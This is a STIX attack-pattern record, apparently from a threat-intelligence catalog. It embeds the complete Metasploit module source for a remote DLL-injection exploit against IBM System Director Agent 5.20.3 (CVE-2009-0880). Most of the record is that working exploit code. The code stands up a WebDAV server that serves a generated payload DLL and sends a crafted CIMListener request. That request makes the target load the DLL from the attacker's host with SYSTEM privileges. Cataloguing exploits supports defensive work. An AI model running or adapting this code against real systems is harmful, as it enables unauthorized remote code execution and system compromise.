{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6083d324-1798-43b5-912c-61786236b2f9",
    "created": "2024-08-14T16:46:17.536199Z",
    "modified": "2024-08-14T16:46:17.536203Z",
    "name": "IBM System Director Agent DLL Injection",
    "description": " This module abuses the \"wmicimsv\" service on IBM System Director Agent 5.20.3 to accomplish arbitrary DLL injection and execute arbitrary code with SYSTEM privileges.  In order to accomplish remote DLL injection it uses a WebDAV service as disclosed by kingcope on December 2012. Because of this, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled. It is enabled and automatically started by default on Windows XP SP3, but disabled by default on Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ibm_director_cim_dllinject.rb",
            "external_id": "ibm_director_cim_dllinject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0880"
        },
        {
            "source_name": "reference",
            "url": "https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20090305-2_IBM_director_privilege_escalation.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2012/Dec/5"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'          => 'IBM System Director Agent DLL Injection',\n      'Description'   => %q{\n          This module abuses the \"wmicimsv\" service on IBM System Director Agent 5.20.3\n        to accomplish arbitrary DLL injection and execute arbitrary code with SYSTEM\n        privileges.\n\n        In order to accomplish remote DLL injection it uses a WebDAV service as disclosed\n        by kingcope on December 2012. Because of this, the target host must have the\n        WebClient service (WebDAV Mini-Redirector) enabled. It is enabled and automatically\n        started by default on Windows XP SP3, but disabled by default on Windows 2003 SP2.\n      },\n      'Author'      => [\n        'Bernhard Mueller', # Vulnerability discovery and exploit using directory traversal\n        'kingcope', # Exploit using WebDAV\n        'juan vazquez' # Metasploit module\n      ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          [ 'CVE', '2009-0880'],\n          [ 'OSVDB', '52616'],\n          [ 'OSVDB', '88102'],\n          [ 'BID', '34065' ],\n          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20090305-2_IBM_director_privilege_escalation.txt' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2012/Dec/5' ]\n        ],\n      'Targets'     =>\n        [\n          [ 'IBM System Director Agent 5.20.3 / Windows with WebClient enabled', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => 'Mar 10 2009'\n    )\n    register_options(\n      [\n        Opt::RPORT(6988),\n        OptString.new('URIPATH',   [ true, \"The URI to use (do not change)\", \"/\" ]),\n        OptPort.new('SRVPORT',     [ true, \"The daemon port to listen on (do not change)\", 80 ])\n      ])\n  end\n\n  def auto_target(cli, request)\n    agent = request.headers['User-Agent']\n\n    ret = nil\n    # Check for MSIE and/or WebDAV redirector requests\n    if agent =~ /(Windows NT 5\\.1|MiniRedir\\/5\\.1)/\n      ret = targets[0]\n    elsif agent =~ /(Windows NT 5\\.2|MiniRedir\\/5\\.2)/\n      ret = targets[0]\n    else\n      print_error(\"Unknown User-Agent: #{agent}\")\n    end\n\n    ret\n  end\n\n\n  def on_request_uri(cli, request)\n\n    mytarget = target\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    end\n\n    # If there is no subdirectory in the request, we need to redirect.\n    if request.uri == '/' || request.uri !~ /\\/[^\\/]+\\//\n      if request.uri == '/'\n        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'\n      else\n        subdir = request.uri + '/'\n      end\n      print_status(\"Request for \\\"#{request.uri}\\\" does not contain a sub-directory, redirecting to #{subdir} ...\")\n      send_redirect(cli, subdir)\n      return\n    end\n\n    # dispatch WebDAV requests based on method first\n    case request.method\n      when 'OPTIONS'\n        process_options(cli, request, mytarget)\n\n      when 'PROPFIND'\n        process_propfind(cli, request, mytarget)\n\n      when 'GET'\n        process_get(cli, request, mytarget)\n\n      when 'PUT'\n        print_status(\"Sending 404 for PUT #{request.uri} ...\")\n        send_not_found(cli)\n\n      else\n        print_error(\"Unexpected request method encountered: #{request.method}\")\n\n    end\n\n  end\n\n\n  #\n  # GET requests\n  #\n  def process_get(cli, request, target)\n\n    print_status(\"Responding to GET request #{request.uri}\")\n    # dispatch based on extension\n    if (request.uri =~ /\\.dll$/i)\n      print_status(\"Sending DLL\")\n      return unless regenerate_payload(cli)\n      dll_payload = generate_payload_dll\n      send_response(cli, dll_payload, { 'Content-Type' => 'application/octet-stream' })\n    else\n      send_not_found(cli)\n    end\n  end\n\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request, target)\n    print_status(\"Responding to WebDAV OPTIONS request\")\n    headers = {\n      #'DASL'   => '<DAV:sql>',\n      #'DAV'    => '1, 2',\n      'Allow'  => 'OPTIONS, GET, PROPFIND',\n      'Public' => 'OPTIONS, GET, PROPFIND'\n    }\n    send_response(cli, '', headers)\n  end\n\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request, target)\n    path = request.uri\n    print_status(\"Received WebDAV PROPFIND request\")\n    body = ''\n\n    if (path =~ /\\.dll$/i)\n      print_status(\"Sending DLL multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\"?>\n<a:multistatus xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\" xmlns:c=\"xml:\" xmlns:a=\"DAV:\">\n<a:response>\n</a:response>\n</a:multistatus>\n|\n    elsif (path =~ /\\.manifest$/i) or (path =~ /\\.config$/i) or (path =~ /\\.exe/i) or (path =~ /\\.dll/i)\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    elsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))\n      # Response for anything else (generally just /)\n      print_status(\"Sending directory multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n    else\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    end\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  def xml_data\n    xml = <<-eos\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<CIM CIMVERSION=\"2.0\" DTDVERSION=\"2.0\">\n  <MESSAGE ID=\"1007\" PROTOCOLVERSION=\"1.0\">\n    <SIMPLEEXPREQ>\n      <EXPMETHODCALL NAME=\"ExportIndication\">\n        <EXPPARAMVALUE NAME=\"NewIndication\">\n          <INSTANCE CLASSNAME=\"CIM_AlertIndication\" >\n            <PROPERTY NAME=\"Description\" TYPE=\"string\">\n              <VALUE>Sample CIM_AlertIndication indication</VALUE>\n            </PROPERTY>\n            <PROPERTY NAME=\"AlertType\" TYPE=\"uint16\">\n              <VALUE>1</VALUE>\n            </PROPERTY>\n            <PROPERTY NAME=\"PerceivedSeverity\" TYPE=\"uint16\">\n              <VALUE>3</VALUE>\n            </PROPERTY>\n            <PROPERTY NAME=\"ProbableCause\" TYPE=\"uint16\">\n              <VALUE>2</VALUE>\n            </PROPERTY>\n            <PROPERTY NAME=\"IndicationTime\" TYPE=\"datetime\">\n              <VALUE>20010515104354.000000:000</VALUE>\n            </PROPERTY>\n          </INSTANCE>\n        </EXPPARAMVALUE>\n      </EXPMETHODCALL>\n    </SIMPLEEXPREQ>\n  </MESSAGE>\n</CIM>\n    eos\n    return xml\n  end\n\n  def check\n\n    peer = \"#{rhost}:#{rport}\"\n    print_status(\"Checking if CIMListener exists...\")\n\n    res = send_request_cgi({\n      'uri'          => \"/CIMListener/\",\n      'method'       => 'M-POST',\n      'ctype'        => 'application/xml; charset=utf-8',\n      'headers'\t   => {\n        \"Man\"     => \"http://www.dmtf.org/cim/mapping/http/v1.0 ; ns=40\",\n        \"CIMOperation\" => \"MethodCall\",\n        \"CIMExport\" => \"MethodRequest\",\n        \"CIMExportMethod\" => \"ExportIndication\"\n      },\n      'data'         => xml_data,\n    }, 1)\n\n    if res and res.code == 200 and res.body =~ /CIMVERSION/\n      return CheckCode::Appears\n    end\n    return CheckCode::Safe\n  end\n\n  def exploit\n\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    super\n\n  end\n\n  def primer\n\n    basename = rand_text_alpha(3)\n    share_name = rand_text_alpha(3)\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    exploit_unc  = \"\\\\\\\\#{myhost}\\\\\"\n\n    vprint_status(\"Payload available at #{exploit_unc}#{share_name}\\\\#{basename}.dll\")\n\n    print_status(\"Injecting DLL...\")\n\n    res = send_request_cgi({\n      'uri'          => \"/CIMListener/#{exploit_unc}#{share_name}\\\\#{basename}.dll\",\n      'method'       => 'M-POST',\n      'ctype'        => 'application/xml; charset=utf-8',\n      'headers'      => {\n        \"Man\"             => \"http://www.dmtf.org/cim/mapping/http/v1.0 ; ns=40\",\n        \"CIMOperation\"    => \"MethodCall\",\n        \"CIMExport\"       => \"MethodRequest\",\n        \"CIMExportMethod\" => \"ExportIndication\"\n      },\n      'data'         => xml_data,\n    })\n\n    if res and res.code == 200 and res.body =~ /CIMVERSION/\n      print_status\"Then injection seemed to work...\"\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected response\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Mar 10 2009",
    "x_mitre_platforms": [
        "win'"
    ]
}